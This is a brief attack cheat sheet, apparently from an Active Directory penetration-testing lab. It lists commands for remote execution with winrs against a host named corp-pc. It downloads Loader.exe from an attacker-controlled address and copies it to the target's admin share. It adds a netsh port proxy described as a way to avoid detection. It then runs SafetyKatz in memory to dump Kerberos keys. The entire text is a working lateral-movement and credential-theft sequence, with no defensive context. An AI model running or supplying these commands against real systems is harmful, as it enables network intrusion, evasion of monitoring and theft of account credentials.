**Check permission to execute command:**
```
winrs -r:corp-pc set computername
winrs -r:corp-pc set username
```

**Download Loader:**
```
iwr http://172.16.100.1/Loader.exe -OutFile C:\Users\Public\Loader.exe
```

**Copy Loadre to corp-pc:**
```
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-pc\C$\Users\Public\Loader.exe
```

**Using winrs, to avoid detection on corp-pc:**
```
$null | winrs -r:corp-pc "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1"
```

**Execute SafetyKatz.exe in-memory on corp-pc:**
```
$null | winrs -r:corp-pc C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```
